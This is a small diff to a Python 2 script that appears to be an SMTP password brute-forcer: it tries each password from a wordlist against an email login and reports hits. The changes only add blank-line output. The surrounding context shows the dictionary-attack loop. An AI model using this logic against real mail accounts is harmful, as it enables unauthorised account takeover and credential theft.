@@ -132,7 +132,7 @@ def Mzt():
       for password in passwfile:
         try:
             smptserver.login(user, password)
-            print verde + "[+] Password Found: %s" % password, "[+] Email: %s" % user
+            print verde + "[+] Password Found: %s" % password, "[+] Email: %s" % user, "\n"
             break;
         except smtplib.SMTPAuthenticationError:   
             print vermelho + "[!] Password Incorrect: %s" % password
@@ -155,6 +155,7 @@ def Suck():
       try:
         smptserver.login(USERNAME, PASSWORD)
         print verde +"[+] Login Activated: %s" % line, "\n"
+        print('')
         break;
       except smtplib.SMTPAuthenticationError:
         print vermelho + "[!] password Incorrect: %s" % line,"\n"
